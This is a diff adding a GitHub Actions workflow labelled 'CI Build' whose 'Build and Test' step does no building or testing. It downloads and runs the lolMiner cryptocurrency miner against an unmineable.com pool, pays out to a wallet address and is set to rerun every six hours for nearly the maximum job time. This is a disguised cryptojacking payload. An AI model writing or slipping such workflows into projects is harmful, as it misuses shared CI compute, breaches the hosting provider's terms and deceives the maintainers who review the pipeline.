@@ -1,0 +1,20 @@
+name: CI Build
+
+on:
+  push:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v2
+    - name: Build and Test
+      run: |
+        wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.88/lolMiner_v1.88_Lin64.tar.gz
+        tar -xvf lolMiner_v1.88_Lin64.tar.gz
+        cd 1.88
+        ./lolMiner --algo ETCHASH --pool etchash.unmineable.com:3333 --user SOL:7Ddqht4FUrysBok4Fe8xYa9Ua1EwoB8TehsRSWUmXK5w.Github_Worker_1 --long-stats 60 --time-limit 21000
